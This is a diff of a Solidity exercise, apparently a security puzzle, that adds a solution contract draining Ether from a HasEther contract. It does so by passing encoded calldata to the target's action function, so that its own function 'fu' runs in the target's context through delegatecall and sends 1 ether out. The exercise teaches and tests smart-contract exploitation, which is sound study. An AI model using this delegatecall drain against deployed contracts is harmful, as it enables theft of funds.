@@ -6,10 +6,35 @@ import {console} from "forge-std/console.sol";
 contract GetEther {
     // write any code you like inside this contract, but only this contract
     // get the Ether from the HasEther contract. You may not modify the test
-    
+
     function getEther(HasEther hasEther) external {
         //...
+
+      bytes memory data = abi.encodeWithSignature("fu(address)", address (this));
+
+      try hasEther.action (address (this), data) {
+        console.log ("@action success");
+      } catch (bytes memory reason){
+        console.log ("@action reverted:");
+        console.logBytes (reason);
+      }
     }
+
+    // fu will be executed in the context of contract that delegates the call
+    function fu (address payable to) public payable {
+       to.send (1 ether);
+    }
+
+    receive() external payable {
+      // Handles plain Ether transfers
+      console.log ("@receivedETH", msg.value);
+    }
+
+    fallback() external payable {
+      uint256 t = msg.value;
+      console.log ("@gotETH", t);
+    }
+
 }
 
 contract HasEther {
